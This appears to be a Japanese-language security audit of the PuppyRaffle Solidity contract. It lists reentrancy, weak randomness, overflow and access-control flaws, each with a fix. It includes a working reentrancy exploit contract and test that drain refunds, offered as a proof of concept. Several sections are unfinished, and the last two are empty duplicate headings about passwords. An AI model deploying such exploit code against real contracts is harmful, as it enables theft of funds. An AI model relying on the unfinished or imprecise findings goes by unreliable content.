+    uint256 public raffleId = 0;

(..... コードの残りの部分 ......)

..... enterRaffle関数内で：

    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
 +      addressToParticipantIndex[newPlayers[i]] = raffleId;
    }

-    // 重複をチェック
+    // @audit ラッフルIDと参加者のマッピングに基づいて重複をチェック

    for (uint256 i = 0; i < players.length - 1; i++) {
-        for (uint256 j = i + 1; j < players.length; j++) {
-            require(
-                players[i] != players[j],
-                "PuppyRaffle: 重複したプレイヤー"
-            );
-        }
+        require(
+            addressToParticipantIndex[players[i]] != raffleId,
+            "PuppyRaffle: 重複したプレイヤー"
+        );


    // @audit pragmaバージョンが最新の場合は、エラー/リバートステートメントを使用できます
    // if(addressToParticipantIndex[newPlayers[i]] != raffleId){
    //     revert PuppyRaffle__DuplicatePlayer();
    // }

    }


```

- 同じ目的のために以下のライブラリをチェックすることもできます：
  - [OpenZepplin EnumerableSet](https://docs.openzeppelin.com/contracts/5.x/api/utils#EnumerableSet)
  - [OpenZeppelin EnumerableMap](https://docs.openzeppelin.com/contracts/5.x/api/utils#EnumerableMap)

#

### [S-中 2] `getActivePlayerIndex()`でのインデックス 0 のプレイヤーがアクティブプレイヤーとして考慮されず、プレイヤーに返金の可能性がない

**説明:**<br />

関数の説明には、配列内にアクティブプレイヤーがいない場合、`getActivePlayerIndex()`は 0 を返すと記載されています：

`/// @return 配列内のプレイヤーのインデックス、アクティブでない場合は0を返します`

ラッフルセッションで唯一のアクティブプレイヤーがインデックス 0 にいる場合、関数は 0 を返し、そのプレイヤーはアクティブプレイヤーとして考慮されず、`refund()`関数で返金を受け取ることができません。

```javascript
require(playerAddress !=
  address(
    0
  ), "PuppyRaffle: プレイヤーは既に返金されているか、アクティブではありません");
```

**影響:**<br />

どのプレイヤーも返金されず、アクティブプレイヤーとして考慮されないことは、中程度の重大度の問題です。これは、ラッフルに最初に参加するプレイヤーにとって悪い設計です。

**概念実証:**<br />

テストケースを作成する必要があります。

**推奨される軽減策:**<br />

- 論理的な問題を修正するために、2 つの異なるパターンを使用することができます。配列内のプレイヤーのインデックス+ブール値を返す（例：プレイヤーなし false + 0、インデックス 0 でのアクティブプレイヤー true + 0）、または配列内にアクティブプレイヤーがいないことを示すために 0 ではなく最大の uint256 を返す。

- 配列内にアクティブプレイヤーがいないことを示すために、getActivePlayerIndex()関数のロジックを変更し、0 ではなく最大の uint256 を返します。

```diff
    /// @notice 配列内でのインデックスを取得する方法
    /// @param player ラッフル内のプレイヤーのアドレス
-    /// @return プレイヤーがアクティブでない場合は0を返します
+    /// @return プレイヤーがアクティブでない場合は最大のuint256を返します

    function getActivePlayerIndex() public view returns (uint256) {
        for (uint256 i; i < players.length; i++) {
            if (players[i] != address(0)) {
                return i;
            }
        }

        // @audit 配列のインデックス0にアクティブプレイヤーがいない場合は、最大のuintを返します
-        return 0;
+        return type(uint256).max;
    }


```

#

### [S-高 1] `refund()`関数内のイベントは、状態変更の前に発行され、状態変更は返金トランザクションの前に行われるべきであり、リエントランシー攻撃を避ける

**説明:**<br />

`refund()`関数内の playerIndex の状態変更は、ユーザーへの値の送信を伴うトランザクションの前に行われるべきです。

`RaffleRefunded`イベントは、状態変更の前に発行されるべきです。イベントを状態変更の前に発行することは、ベストプラクティスです。

これにより、コントラクトの状態に関する混乱を避け、リエントランシー攻撃の可能性を開かないようにします。

**影響:**<br />

- イベントが状態変更の前に発行されず、またはユーザーへの返金トランザクションの前に状態変更が行われない場合、リエントランシー攻撃が発生する可能性があります。なぜなら、状態変更が完了するまで、状態は変更されたと見なされず、関数への他の呼び出しがまだ考慮されないからです。

- コントラクトから返金資金を吸い取り、他のユーザーにとって返金機能を使用できなくすることにつながります。

**概念実証:**<br />

プロジェクトのルートフォルダで`slither .`を実行すると、以下の詳細が出力されます：

<details>
<summary> Slitherの出力を見る</summary>
```javascript
INFO:Detectors:
Reentrancy in PuppyRaffle.refund(uint256) (src/PuppyRaffle.sol#152-175):
        External calls:
        - address(msg.sender).sendValue(entranceFee) (src/PuppyRaffle.sol#169)
        State variables written after the call(s):
        - players[playerIndex] = address(0) (src/PuppyRaffle.sol#171)
        PuppyRaffle.players (src/PuppyRaffle.sol#35) can be used in cross function reentrancies:
        - PuppyRaffle.enterRaffle(address[]) (src/PuppyRaffle.sol#102-148)
        - PuppyRaffle.getActivePlayerIndex(address) (src/PuppyRaffle.sol#182-195)
        - PuppyRaffle.players (src/PuppyRaffle.sol#35)
        - PuppyRaffle.refund(uint256) (src/PuppyRaffle.sol#152-175)
        - PuppyRaffle.selectWinner() (src/PuppyRaffle.sol#203-244)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-1
```

</details>

- 攻撃者コントラクトを使用したリエントランシー攻撃のテストケース：

```javascript

    function testCanGetRefundReentrancy() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        console.log(
            "攻撃前のラッフルコントラクトの残高： %s",
            address(puppyRaffle).balance
        );

        // 攻撃者を導入
        AttackReentrant attackerContract = new AttackReentrant(puppyRaffle);
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether);

        uint256 attackerContractBalanceBefore = address(attackerContract)
            .balance;

        vm.prank(attacker);
        attackerContract.attack{value: entranceFee}();

        console.log(
            "攻撃前の攻撃者コントラクトの残高： %s",
            attackerContractBalanceBefore
        );
        console.log(
            "攻撃後の攻撃者コントラクトの残高： %s",
            address(attackerContract).balance
        );

               console.log(
            "攻撃後のラッフルコントラクトの残高： %s",
            address(puppyRaffle).balance
        );
    }


```

攻撃者コントラクト：

```javascript
contract AttackReentrant {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    receive() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}


```

**推奨される軽減策:**<br />

`refund`関数におけるイベントの発行場所と状態変更の場所を変更して、リエントランシー攻撃を避けます。

```diff
    function refund(uint256 playerIndex) public {
        // @audit この関数にはMEV攻撃も含まれています、トランザクションのフロントランニング
        address playerAddress = players[playerIndex];
        require(
            playerAddress == msg.sender,
            "PuppyRaffle: 返金はプレイヤーのみ可能"
        );
        require(
            playerAddress != address(0),
            "PuppyRaffle: プレイヤーは既に返金されているか、アクティブではありません"
        );

+        // @audit リエントランシー攻撃を避けるために、イベントと状態変更の場所を変更
+       emit RaffleRefunded(playerAddress);
+       players[playerIndex] = address(0);

        payable(msg.sender).sendValue(entranceFee);

-        players[playerIndex] = address(0);
-        emit RaffleRefunded(playerAddress);
    }


```

- 関数に ReentrancyGuard を追加することもできます。`openZeppelin`ライブラリ[ReentrancyGuard](https://docs.openzeppelin.com/contracts/5.x/api/utils#ReentrancyGuard)

#

### [S-高] 当選者と当選した NFT が予測可能、弱い RNG 攻撃により毎回当選する可能性

**説明:**<br />

`selectWinner()`関数は、3 つの値をハッシュ化して当選者を選択します。

```javascript
        uint256 winnerIndex = uint256(
            keccak256(
                abi.encodePacked(msg.sender, block.timestamp, block.difficulty)
            )
        ) % players.length;
```

`block.difficulty`はランダム性の弱い源であり、マイナーによって操作され、ハッシュの結果に影響を与える可能性があります。`block.timestamp`も同様に事前に推測可能です。

- NFT のレアリティのランダム性についても同様です。

```javascript
        uint256 rarity = uint256(
            keccak256(abi.encodePacked(msg.sender, block.difficulty))
        ) % 100;
```

**影響:**<br />

- 攻撃者が毎回当選者となり、毎回 NFT を獲得する可能性があります。その結果、他のユーザーにとってコントラクトは使用不可能になります。
- 当選者は NFT だけでなく、エントランスフィーの一部も獲得します。
- 攻撃者がいる場合、当選者として使用されるアドレスはブラックリスト化を避けるために毎回変更されます。これは留意する点です。

**概念実証:**<br />

To DO

**推奨される軽減策:**<br />

- 数学的に安全な乱数を得るために、Chainlink VRF（Verifiable Random Function）を使用して安全な乱数を取得し、それに基づいて当選者を選択してください。[Chainlink VRF](https://docs.chain.link/vrf)

- これは NFT のレアリティが決定される方法にも適用する必要があります。特定の NFT を獲得するための勝利の操作を避けるためです。

#

### [S-高] オーナーが引き出すことができる資金におけるオーバーフロー + 精度の損失 + uint256 から uint64 への安全でないキャスト

**説明:**<br />

`0.8.0`未満の Solidity バージョンでは、int および uint は最初から巻き戻ります。`uint64`の最大値は`18446744073709551615`です。totalFees がこの数値を超えると、0 から始まります。

- 手数料は 18 桁の小数点を使用します。total fee が引き出し可能なカウントに 0.1eth 以上ある場合、例えば 18.5eth であれば、100000000000000000 + 18446744073709551615 = 50000000000000000 -> 0.05eth になります。なぜなら巻き戻しは最初から始まるためです。(数値は正確ではありませんが、私が提供した結果に近いものになります)。

```javascript
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;

        // @audit オーバーフロー
        totalFees = totalFees + uint64(fee);
```

- さらに、精度の損失があり、オーナーは手数料の正確な金額またはコントラクトによって彼に支払われるべき最大金額を引き出すことができません。

- また、uint256 から uint64 への安全でないキャスティングがあります。20eth が uint64 にキャストされると、18.4eth から 0 に巻き戻り、結果として 1.5eth になります。

**影響:**<br />

- オーナーは 18.4eth 以上の手数料を引き出すことができず、その数値に達し、それを超えると、手数料のカウンターがゼロから再開されるため、オーナーはほこりを引き出すしかありません。

**概念実証:**<br />

To do

**推奨される軽減策:**<br />

- 18 桁のトークンに uint64 を使用しないでください。
- Solidity バージョンを最新バージョンにアップグレードして、この種の問題を回避する必要があります。
- uint64 を uint256 に変更することを検討してください。18 桁のトークンには uint256 を使用することが最善の慣行とされています。これは、最大上限に到達することがほぼ計算上困難であるためです。
- 0.8.0 未満のバージョンでは SafeMath を使用してオーバーフローを回避するべきですが、Solidity の最新バージョンにアップグレードすることがより良いです。

#

### [S-高] `selectWinner()` 関数の `_safeMint` は、再入可能攻撃を避けるために、勝者に手数料の一部を送信するトランザクションの前に終了するべきです。

**説明:**<br />

`selectWinner()` 関数の `_safeMint` の状態変更は、再入可能攻撃を避けるために、勝者に手数料の一部を送信するトランザクションの前に行われるべきです。
これにより、コントラクトの状態に関する混乱を避け、再入可能攻撃の可能性を開け放つことを避けます。

**影響:**<br />

- `selectWinner` 関数に対する再入可能攻撃を行うことで、無限に NFT を獲得しようとする試み。そして、コントラクトからすべての手数料とイーサを吸い取ります。
- この攻撃の最悪の部分は、実際には再入可能攻撃ではなく、それに伴うアクセス制御の欠如です。誰でもいつでも抽選を終了させ、勝者として選ばれることができます。そして、オーナーが手数料を引き出していない場合、毎日正しい時間に関数を呼び出すだけで、コントラクトの手数料を徐々に吸い取ることができます。

**概念実証:**<br />

プロジェクトのルートフォルダで`slither .`を実行すると、以下の詳細が出力されます：

<details>
<summary> Slitherの出力を見る</summary>

```javascript
Reentrancy in PuppyRaffle.selectWinner() (src/PuppyRaffle.sol#205-251):
        External calls:
        - (success) = winner.call{value: prizePool}() (src/PuppyRaffle.sol#248)
        - _safeMint(winner,tokenId) (src/PuppyRaffle.sol#250)
                - returndata = to.functionCall(abi.encodeWithSelector(IERC721Receiver(to).onERC721Received.selector,_msgSender(),from,tokenId,_data),ERC721: transfer to non ERC721Receiver implementer) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#441-447)
                - (success,returndata) = target.call{value: value}(data) (lib/openzeppelin-contracts/contracts/utils/Address.sol#119)
        External calls sending eth:
        - (success) = winner.call{value: prizePool}() (src/PuppyRaffle.sol#248)
        - _safeMint(winner,tokenId) (src/PuppyRaffle.sol#250)
                - (success,returndata) = target.call{value: value}(data) (lib/openzeppelin-contracts/contracts/utils/Address.sol#119)
        Event emitted after the call(s):
        - Transfer(address(0),to,tokenId) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#343)
                - _safeMint(winner,tokenId) (src/PuppyRaffle.sol#250)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-3
```

</details>

- 攻撃者コントラクトを使用した再入可能攻撃のテストケース：

```javascript
to do
```

- 攻撃者コントラクト：

```javascript
to do

```

**推奨される軽減策:**<br />

- `_safeMint` が呼び出される場所を変更し、それが呼び出された後に勝者に手数料が支払われるようにします。

```diff
+       _safeMint(winner, tokenId);
        (bool success, ) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: 勝者への賞金プールの送金に失敗");
-       _safeMint(winner, tokenId);
```

#

### [S-高 2] `selectWinner()` 関数にアクセス制御がないことにより、いつでも抽選を終了させて勝者として選ばれる可能性があります。

**説明:**<br />

- この攻撃の最悪の部分は、アクセス制御の欠如自体ではなく、それに伴う再入可能攻撃です。誰でもいつでも抽選を終了させ、勝者として選ばれることができます。オーナーが手数料を引き出していない場合、毎日オーナーの行動の前に正しい時間に関数を呼び出すだけで、コントラクトの手数料を徐々に吸い取ることができます。

**影響:**<br />

- ユーザーによる抽選の使用に深刻な影響を与えます。NFT と残っている手数料をすべて獲得するためのほぼ即時の DOS 攻撃です。

**推奨される軽減策:**<br />

- `selectWinner()` 関数に OpenZeppelin から使用している `Ownable` ライブラリの OnlyOwner 修飾子を追加します。

```diff
-    function selectWinner() external {
+    function selectWinner() external onlyOwner {
```

#

### [S-非常に高い] アクセス制御攻撃。誰でも新しいパスワードを設定できます。

**説明:**<br />

**影響:**<br />

**概念実証:**<br />

**推奨される軽減策:**<br />

#

### [S-非常に高い] アクセス制御攻撃。誰でも新しいパスワードを設定できます。

**説明:**<br />

**影響:**<br />

**概念実証:**<br />

**推奨される軽減策:**<br />
